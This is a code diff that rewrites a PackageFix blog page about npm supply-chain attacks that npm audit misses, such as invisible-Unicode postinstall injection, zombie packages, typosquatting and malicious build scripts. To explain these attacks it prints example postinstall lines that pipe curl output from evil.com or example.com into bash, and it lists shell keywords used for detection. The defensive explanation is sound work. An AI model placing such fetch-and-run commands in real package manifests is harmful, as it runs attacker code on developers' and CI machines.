@@ -427,109 +427,175 @@ blog_faqs = [
     ("What is the CISA KEV catalog?","The CISA Known Exploited Vulnerabilities catalog lists vulnerabilities confirmed to be actively exploited in real attacks. npm packages on this list (lodash, qs, jsonwebtoken, vm2) should be treated as critical-priority fixes regardless of your usual patch schedule.")
 ]
 
-blog_body = f"""
-<h1>5 Supply Chain Attacks Hiding in Your package.json Right Now</h1>
+blog_body = (
+"""
+<h1>5 supply chain attacks that npm audit won't catch</h1>
 <div class="blog-meta">
   <span>March 22, 2026</span>
   <span>·</span>
-  <span>MetricLogic / PackageFix</span>
+  <span>PackageFix</span>
   <span>·</span>
   <span>8 min read</span>
 </div>
 
-<p class="lead">npm audit tells you about CVEs. It doesn't tell you about the package that went dormant for 14 months and just pushed an update. It doesn't tell you about the invisible Unicode character in your postinstall script. It doesn't tell you that one of your dependencies is one character away from a known malware package. Here's what npm audit misses — and how to detect it.</p>
+<p class="lead">You run npm audit. It comes back clean.
+You ship. Three days later someone's pulling secrets
+out of your CI environment. Here's what npm audit
+doesn't check — and what you should be doing instead.</p>
 
-<h2>1. Glassworm — Invisible Unicode in Your Scripts</h2>
+<h2>First: npm audit is good. It's just not enough.</h2>
+
+<p>npm audit does one thing well: it checks your
+dependency versions against a database of known CVEs.
+That's genuinely useful. But the threat model has
+changed. In 2026, the attacks that actually hit
+production aren't always CVEs — they're compromised
+maintainer accounts, invisible characters in scripts,
+and package names that look right but aren't.</p>
+
+<p>None of those show up in npm audit. Here's what
+to look for.</p>
+
+<h2>1. The invisible character in your postinstall</h2>
 
 <div class="attack-card">
-  <h3>Attack type: Script injection · Detection: PackageFix Unicode scan</h3>
-  <p>A compromised package embeds invisible Unicode characters (zero-width spaces, variation selectors U+FE00–U+FE0F) in npm scripts. The script looks clean in your editor. To the shell, it contains a hidden payload.</p>
+  <h3>Glassworm — Unicode injection in npm scripts</h3>
+  <p>Your package looks clean. A hex editor tells a
+  different story.</p>
 </div>
 
-<p>This is not theoretical. The Glassworm campaign (March 2026) actively used Unicode variation selectors in npm postinstall scripts. The attack is invisible to code review because most editors either don't render these characters or render them identically to their visible equivalents.</p>
+<p>This one is genuinely frightening. An attacker
+compromises a package and adds an invisible Unicode
+character — a zero-width space (U+200B) — to the
+postinstall script. Your editor doesn't render it.
+Your code review doesn't catch it. The shell runs
+the full string, including whatever comes after the
+invisible character.</p>
 
-<p>What your package.json looks like in your editor:</p>
+<p>What you see in your editor:</p>
 <pre>"postinstall": "node setup.js"</pre>
 
-<p>What it actually contains (revealed in a hex editor):</p>
-<pre>"postinstall": "node\u200B setup.js && curl https://attacker.com/payload.sh | bash"</pre>
+<p>What's actually there:</p>
+<pre>"postinstall": "node\u200B setup.js && curl https://evil.com/payload.sh | bash"</pre>
 
-<p>The zero-width space (U+200B) is invisible. The shell executes the entire string.</p>
+<p>This isn't hypothetical. The Glassworm campaign in
+March 2026 used exactly this technique. PackageFix
+scans every manifest for non-printable Unicode before
+it even starts parsing. If it finds anything, you get
+a red banner before the scan runs: "Do not use this
+manifest."</p>
 
-<p><strong>How to detect it:</strong> Paste your package.json into PackageFix. It scans all manifest content for invisible Unicode ranges before parsing. If found, a red banner appears: "Invisible Unicode characters detected — do not use this manifest."</p>
-
-<h2>2. The Zombie Package — Dormant Then Suddenly Updated</h2>
-
-<div class="attack-card">
-  <h3>Attack type: Compromised maintainer · Detection: PackageFix suspicious package flag</h3>
-  <p>A package hasn't been updated in 18 months. The maintainer's npm account gets compromised. A malicious version is published. The package has millions of weekly downloads. Every project that runs npm install gets the payload.</p>
-</div>
-
-<p>This is how the event-stream attack worked in 2018. The maintainer handed off the package to a stranger who published a malicious version. In 2024–2026, this attack pattern has accelerated — compromised maintainer accounts are actively targeted because they provide instant distribution to millions of installs.</p>
-
-<p>npm audit won't flag this. The malicious version may have no CVE yet — CVEs are assigned after discovery, not before. By the time a CVE is assigned, the attack has already run on thousands of machines.</p>
-
-<p><strong>How to detect it:</strong> PackageFix fetches the npm registry's time.modified and version history for each package. If a package was dormant for more than 24 months and received an update within the last 72 hours with more than 100,000 weekly downloads, it's flagged with a 🧟 ZOMBIE badge: "Updated 4 hours ago after 18 months of inactivity. May indicate a compromised maintainer account."</p>
-
-<h2>3. Typosquatting — One Character Away from Disaster</h2>
+<h2>2. The package that just woke up after 14 months</h2>
 
 <div class="attack-card">
-  <h3>Attack type: Package name confusion · Detection: PackageFix Levenshtein check</h3>
-  <p>An attacker registers "expres" on npm. A developer types npm install expres (missing the s). The malicious package installs. postinstall runs. Credentials exfiltrated.</p>
+  <h3>Zombie packages — compromised maintainer accounts</h3>
+  <p>A package goes quiet for over a year. Then suddenly
+  it publishes a new version.</p>
 </div>
 
-<p>Typosquatting attacks on npm are continuous. The npm registry has no automatic protection against names that are one character away from popular packages. Every year, security researchers discover hundreds of typosquatted packages — many with postinstall scripts that exfiltrate environment variables.</p>
+<p>This is the fingerprint of a compromised maintainer
+account. The attacker gains access, publishes a
+malicious version, and waits. The package has millions
+of weekly downloads, so the payload reaches a huge
+number of machines before anyone notices.</p>
 
-<p>Common targets: express → expres, lodash → lodas, react → reacts, webpack → webpak, axios → axois.</p>
+<p>The event-stream attack in 2018 worked exactly this
+way. The maintainer handed the package to a stranger
+who published a backdoor. In 2024-2026 the same pattern
+keeps repeating because it works — npm doesn't
+automatically flag a dormant package that suddenly
+becomes active.</p>
 
-<p><strong>How to detect it:</strong> PackageFix runs a Levenshtein distance check against a hardcoded list of the top 100 npm packages for every dependency name in your manifest. A distance of 1 triggers a ⚠ TYPOSQUAT? badge: "Similar to express — verify this is the correct package."</p>
+<p>PackageFix checks how long it's been since each
+npm package published a new version. If a package was
+dormant for over 24 months and just pushed something
+in the last 72 hours with 100K+ weekly downloads,
+you get a 🧟 flag: "Updated 4 hours ago after 18 months
+of inactivity."</p>
 
-<h2>4. Build Script Injection — curl in Your postinstall</h2>
+<h2>3. "expres" instead of "express"</h2>
 
 <div class="attack-card">
-  <h3>Attack type: Arbitrary code execution · Detection: PackageFix build script scan</h3>
-  <p>A dependency's postinstall script contains curl https://example.com/setup.sh | bash. This runs automatically when you npm install. You never see it unless you read every package's package.json in node_modules.</p>
+  <h3>Typosquatting — one character from disaster</h3>
+  <p>npm install expres. Note the missing 's.</p>
 </div>
 
-<p>Legitimate packages sometimes use postinstall scripts (native module compilation, binary downloads). Malicious packages use them for code execution. The difference isn't always obvious from the package name or description.</p>
+<p>Attackers register package names that are one
+typo away from popular packages. expres instead of
+express. lodas instead of lodash. reacts instead of
+react. When you mistype in npm install, you get the
+malicious package. Its postinstall script runs
+immediately. By the time you notice something's wrong,
+it's already executed.</p>
 
-<p>npm does not warn you when a postinstall script contains network calls. npm install just runs it.</p>
+<p>npm has no protection against this. The registry
+is first-come-first-served. PackageFix runs a
+Levenshtein distance check against the top 100 npm
+packages for every dependency name in your manifest.
+One character off gets a ⚠ TYPOSQUAT? badge: "Similar
+to express — verify this is the correct package."</p>
 
-<p><strong>How to detect it:</strong> PackageFix scans all scripts fields in your package.json for dangerous patterns: curl, wget, sh -c, bash -c, python -c, eval. If found, an orange banner appears: "Build script contains network or shell commands — review before proceeding" with the exact script content shown.</p>
-
-<h2>5. The CISA KEV Package — Actively Exploited Right Now</h2>
+<h2>4. curl in a postinstall you didn't write</h2>
 
 <div class="attack-card">
-  <h3>Attack type: Known CVE exploitation · Detection: PackageFix CISA KEV flag</h3>
-  <p>Your package.json has lodash 4.17.15. CVE-2020-8203 (prototype pollution) is in the CISA Known Exploited Vulnerabilities catalog — meaning it's being used in real attacks against real systems right now. npm audit flags it as HIGH. What npm audit doesn't tell you: this one is in the wild.</p>
+  <h3>Build script injection — code that runs on install</h3>
+  <p>You didn't write it, but it runs on your machine.</p>
 </div>
 
-<p>The CVE database contains tens of thousands of vulnerabilities. The CISA KEV catalog contains the ones that are actually being exploited. The distinction matters for prioritization — you can't fix everything immediately, but you should fix the KEV entries immediately.</p>
+<p>When you npm install, every dependency's postinstall
+script runs automatically. Most are legitimate —
+native module compilation, binary downloads. Some
+aren't. A compromised package can have a postinstall
+that looks like this:</p>
 
-<p>npm packages on the current CISA KEV list: lodash, qs, jsonwebtoken, minimist, vm2, axios, follow-redirects, sharp.</p>
+<pre>"postinstall": "curl https://example.com/setup.sh | bash"</pre>
 
-<p><strong>How to detect it:</strong> PackageFix checks every scanned package against the live CISA KEV catalog. KEV packages get a red 🔴 dot in the CVE table and appear in the ACTIVELY EXPLOITED banner at the top of results.</p>
+<p>npm runs it without warning. You never see it
+unless you manually inspect node_modules. PackageFix
+scans every scripts field in your manifest for
+dangerous patterns: curl, wget, sh -c, bash -c, eval.
+If found, you get an orange warning showing the exact
+script content before you scan.</p>
 
-<h2>How to Check Your package.json Right Now</h2>
+<h2>5. Your CVE is on the CISA hit list</h2>
 
-<p>All 5 attack vectors are checked automatically when you paste your package.json into PackageFix:</p>
-<ol style="padding-left:20px;margin:12px 0 20px;color:var(--muted);font-size:12px;line-height:2">
-  <li>Open <a href="https://packagefix.dev">packagefix.dev</a></li>
-  <li>Paste your package.json (drop package-lock.json too for transitive scanning)</li>
-  <li>Click Scan Dependencies</li>
-  <li>Check the results: CVE table, CISA KEV banner, ZOMBIE badges, TYPOSQUAT warnings, build script alerts</li>
-  <li>Download the fixed package.json if any CVEs are found</li>
+<div class="attack-card">
+  <h3>CISA KEV — the CVEs that are actually being used</h3>
+  <p>Not all HIGH severity CVEs are equal. Some are
+  theoretical. Some are being used in real attacks
+  right now.</p>
+</div>
+
+<p>The CVE database has tens of thousands of entries.
+Most will never be exploited. The CISA Known Exploited
+Vulnerabilities catalog is different — it's a curated
+list of vulnerabilities that have been confirmed in
+real attacks against real systems. A CVE on CISA KEV
+is not theoretical. It's happening.</p>
+
+<p>npm packages currently on the CISA KEV list: lodash,
+qs, jsonwebtoken, minimist, vm2, axios, follow-redirects,
+sharp. npm audit flags these as HIGH, which sounds
+urgent but looks the same as every other HIGH. PackageFix
+adds a red 🔴 KEV dot and a banner at the top of results:
+"ACTIVELY EXPLOITED — fix these first."</p>
+
+<h2>Run these checks on your package.json right now</h2>
+
+<ol style="padding-left:20px;margin:12px 0 20px;color:var(--muted);font-size:12px;line-height:2.2">
+  <li>Go to <a href="https://packagefix.dev">packagefix.dev</a></li>
+  <li>Paste your package.json — or drop package-lock.json too for transitive scanning</li>
+  <li>Hit Scan</li>
+  <li>Check for: CISA KEV banner, ZOMBIE badges, TYPOSQUAT? warnings, Unicode alerts, build script warnings</li>
+  <li>Download the fixed package.json if anything is flagged</li>
 </ol>
 
-{cta()}
-
-<h2>The Uncomfortable Truth About npm audit</h2>
-<p>npm audit is a good tool. It catches known CVEs reliably and it's built into the npm workflow. But it was designed for a 2018 threat model where the main risk was unpatched dependencies with known CVEs.</p>
-<p>The 2026 threat model includes compromised maintainer accounts, invisible Unicode payloads, typosquatting at scale, and malicious build scripts. npm audit doesn't check for any of these — and it was never designed to.</p>
-<p>PackageFix is not a replacement for npm audit. It's the layer that catches what npm audit misses. Run both.</p>
-
-{faq_html(blog_faqs)}
-
+<p>The whole thing takes about 10 seconds. No install.
+No GitHub connection. Nothing leaves your browser.</p>
+"""
+    + cta()
+    + faq_html(blog_faqs)
+    + """
 <div style="margin:40px 0">
   <h2>Related Guides</h2>
   <div class="related-grid">
@@ -540,11 +606,12 @@ blog_body = f"""
   </div>
 </div>
 """
+)
 
 blog_schemas = [
     {"@type":"Article",
-     "headline":"5 Supply Chain Attacks Hiding in Your package.json Right Now",
-     "description":"npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for.",
+     "headline":"5 supply chain attacks that npm audit won't catch",
+     "description":"npm audit only catches CVEs. Glassworm Unicode injection, zombie packages, typosquatting, malicious postinstall scripts, and CISA KEV priorities need extra checks — here's what PackageFix adds.",
      "datePublished":"2026-03-22","dateModified":"2026-03-22",
      "author":{"@type":"Organization","name":"MetricLogic","url":"https://packagefix.dev"},
      "publisher":{"@type":"Organization","name":"PackageFix","url":"https://packagefix.dev"},
@@ -552,7 +619,7 @@ blog_schemas = [
     {"@type":"BreadcrumbList","itemListElement":[
         {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
         {"@type":"ListItem","position":2,"name":"Blog","item":BASE_URL+"/blog"},
-        {"@type":"ListItem","position":3,"name":"Supply Chain Attacks in package.json","item":BASE_URL+"/blog/supply-chain-attacks-package-json"}
+        {"@type":"ListItem","position":3,"name":"Supply chain attacks npm audit won't catch","item":BASE_URL+"/blog/supply-chain-attacks-package-json"}
     ]},
     {"@type":"FAQPage","mainEntity":[
         {"@type":"Question","name":q,"acceptedAnswer":{"@type":"Answer","text":a}}
@@ -561,10 +628,10 @@ blog_schemas = [
 ]
 
 write("blog/supply-chain-attacks-package-json", shell(
-    "5 Supply Chain Attacks Hiding in Your package.json — PackageFix",
-    "npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for and how to detect them.",
+    "5 supply chain attacks that npm audit won't catch — PackageFix",
+    "npm audit only catches CVEs. Learn what it misses: Glassworm Unicode injection, zombie packages, typosquatting, build scripts, and CISA KEV — and how to check in seconds.",
     "/blog/supply-chain-attacks-package-json",
-    [("PackageFix","/"),("Blog","/blog"),("Supply Chain Attacks in package.json",None)],
+    [("PackageFix","/"),("Blog","/blog"),("Supply chain attacks npm audit won't catch",None)],
     blog_body, blog_schemas
 ))
 
